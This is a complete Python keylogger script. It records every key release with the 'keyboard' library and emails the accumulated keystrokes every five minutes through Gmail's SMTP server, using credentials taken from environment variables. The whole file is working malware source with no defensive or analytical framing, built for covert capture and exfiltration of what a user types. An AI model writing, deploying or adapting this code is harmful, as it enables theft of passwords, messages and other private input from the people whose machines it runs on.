#!/usr/bin/python

import keyboard  # for key logs
import smtplib  # for sending email using SMTP
import os  # for environment variables
from threading import Timer

# Configurations
SEND_REPORT_EVERY = 300  # 5 minutes
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")  # Load from environment variable
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")  # Load from environment variable

if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
    raise ValueError("Email and password must be set as environment variables.")

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""  # the keystrokes within `self.interval`

    def callback(self, event):
        """This callback is invoked whenever a keyboard event is occurred (i.e when a key is released in this example)."""
        name = event.name

        if len(name) > 1:
            # Special keys (e.g., ctrl, alt, etc.)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f" [{name.upper()}]"

        self.log += name

    def send_mail(self, message):
        """Send the captured keystrokes via email."""
        try:
            with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
                server.starttls()  # Start TLS encryption
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
        except Exception as e:
            print(f"Error sending email: {e}")

    def report(self):
        """This function gets called every `self.interval`. Sends keylogs and resets `self.log`."""
        if self.log:
            self.send_mail(self.log)  # Send the captured keystrokes
            self.log = ""  # Reset the log

        # Set the timer to call the report function again after the defined interval
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        """Start the keylogger."""
        keyboard.on_release(callback=self.callback)  # Listen for key release events
        self.report()  # Start reporting at intervals

        # Keep the program running indefinitely to capture keys
        keyboard.wait()  # This blocks the program from exiting

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
